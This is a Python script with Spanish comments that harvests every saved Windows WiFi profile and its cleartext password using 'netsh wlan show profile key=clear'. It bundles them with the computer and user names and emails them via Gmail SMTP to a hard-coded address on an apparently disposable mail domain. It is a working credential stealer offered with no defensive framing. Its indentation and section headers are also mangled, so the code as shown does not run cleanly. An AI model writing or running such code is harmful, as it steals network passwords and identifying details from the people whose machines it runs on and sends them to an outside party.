-- coding: latin-1 --
import smtplib
from email.message import EmailMessage
import subprocess
import os
from datetime import datetime
= CONFIGURACION =
GMAIL_USER = ""
GMAIL_PASS = ""  # Contrase¤a de aplicacion
TEMP_MAIL_TO = "moweji5386@fulldiets.com"
========
def obtener_wifi():
    """Obtiene todas las redes WiFi y contrase¤as"""
    resultado = []
    resultado.append("= REDES WIFI GUARDADAS =\n")
# Obtener todos los perfiles
perfiles = subprocess.run(
    ["netsh", "wlan", "show", "profile"],
    capture_output=True,
    text=True
).stdout

resultado.append(perfiles)
resultado.append("\n=== CONTRASENAS ===\n")

# Extraer cada perfil y su clave
lineas = perfiles.split('\n')
for linea in lineas:
    if ":" in linea and "Perfil" in linea:
        nombre = linea.split(":", 1)[1].strip()
        if nombre:
            # Obtener clave del perfil
            clave = subprocess.run(
                ["netsh", "wlan", "show", "profile", f"name={nombre}", "key=clear"],
                capture_output=True,
                text=True
            ).stdout
            
            # Buscar la linea de la contrase¤a
            for cl in clave.split('\n'):
                if "Contenido de la clave" in cl or "Key Content" in cl:
                    resultado.append(f"Red: {nombre} -> {cl.strip()}\n")
                    break
            else:
                resultado.append(f"Red: {nombre} -> [Sin contrase¤a o abierta]\n")

return "\n".join(resultado)
def enviar_correo(contenido):
    """Envia el correo con la informacion"""
    msg = EmailMessage()
    msg["From"] = GMAIL_USER
    msg["To"] = TEMP_MAIL_TO
    msg["Subject"] = f"WiFi y Sistema - {os.getenv('COMPUTERNAME')}"
cuerpo = f"""
INFORME COMPLETO
================

{contenido}

INFORMACION DEL SISTEMA
=======================
Equipo: {os.getenv('COMPUTERNAME')}
Usuario: {os.getenv('USERNAME')}
Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

msg.set_content(cuerpo)

with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()
    server.login(GMAIL_USER, GMAIL_PASS)
    server.send_message(msg)

print("Correo enviado exitosamente!")
= EJECUTAR =
print("Obteniendo informacion de redes WiFi...")
info = obtener_wifi()
print("Enviando correo...")
enviar_correo(info)
print("Proceso completado!")
